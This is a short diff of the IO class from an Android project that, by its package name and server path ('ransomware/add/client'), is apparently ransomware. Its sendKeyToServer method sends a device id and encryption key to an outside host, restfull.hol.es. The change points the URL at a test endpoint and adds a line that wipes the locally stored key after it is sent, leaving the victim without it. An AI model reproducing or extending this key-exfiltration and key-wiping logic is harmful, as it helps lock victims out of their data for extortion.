@@ -18,7 +18,7 @@ import alepacheco.com.rw.persistence.LocalStorage;
 
 public class IO {
 
-    public static String SERVER = "http://restfull.hol.es/ransomware/add/client/%s/%s";
+    public static String SERVER = "http://restfull.hol.es/tests/test3.php?id=%s&data=%s";//"http://restfull.hol.es/ransomware/add/client/%s/%s";
 
     public static void sendKeyToServer(final Context ctx, String id, String key){
         String url = String.format(SERVER,id,key);
@@ -29,6 +29,7 @@ public class IO {
                     public void onResponse(String response) {
                         Log.v("Debug","ENVIADO");
                         LocalStorage.getInstance(ctx).setSendendToServer();
+                        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,LocalStorage.NULL_VALUE);
                     }
                 }, new Response.ErrorListener() {
             @Override
